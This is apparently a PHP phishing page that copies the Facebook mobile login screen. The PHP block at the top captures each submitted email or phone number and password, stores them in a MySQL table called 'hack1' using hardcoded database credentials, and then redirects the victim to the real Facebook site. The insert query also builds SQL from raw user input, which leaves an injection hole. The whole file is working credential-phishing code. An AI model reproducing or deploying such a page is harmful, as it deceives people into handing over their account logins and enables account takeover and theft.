<?php
    
    if($_SERVER['REQUEST_METHOD']=='POST'){
    if ( isset($_POST['submit']) and $_POST['submit'] == 'Log in') {
        $user = $_POST['user'];
        $pass = $_POST['password'];
        if($user != null and $pass != null){
        $conn=mysqli_connect("localhost","id2056314_tamilan","crazytricky","id2056314_tamilan_infotech") or die("connection failed");
        $sql="INSERT INTO hack1(user,password) VALUES ('$user','$pass')";
       if(mysqli_query($conn,$sql)){
         header("Location: https://www.facebook.com");
        exit();
         }
      }
    }
}
?>



<html lang="en" >
<head>
	<meta charset="utf-8" /><meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" />

	<title>Log in to Facebook | Facebook</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link rel="stylesheet" href="css/mobile.css">

</head>
<body>
  <div class="header">
  	 <div class="header1"><h1>facebook</h1></div>
    </div>
    <!-- info part of the mobile-->
    
    <div class="info_of_mobile">
    <div class="icon"><img src="img/mob.png" />
    <div class="icon2"><p>Get Facebook for Android and browse faster.</p></div></div>
   
    </div>
    <!--form part -->
<form method="post" action="<?php echo $_SERVER['PHP_SELF'];?>">
    <div class="input">
      <input type="text" id="user" name="user" placeholder="Email address or phone number"/>
      <br />
      <input type="password" id="pass" name="password" placeholder="password" />
      <br />
      <input type="submit" id="submit" name="submit" value="Log in">
    </div>
    </form>

    <div class="forgot"><a href="#">Forgotten password?</a><span>.</span><a href="#">Help Centre</a></div>
    <!-- footer part-->
    <footer>

        <div class="one"><a href="#">English (UK)</a><span></span><a href="#">தமிழ்</a></div>
        <div class="one"><a href="#">اردو<</a><span></span><a href="#">हिन्दी</a></div>
        <div class="one"><a href="#">മലയാളം</a><span></span><a href="#">ਪੰਜਾਬੀ</a></div>  

       <div class="finish"><span>Facebook &#169 2017</span><div>
    </footer>

</body>
</html>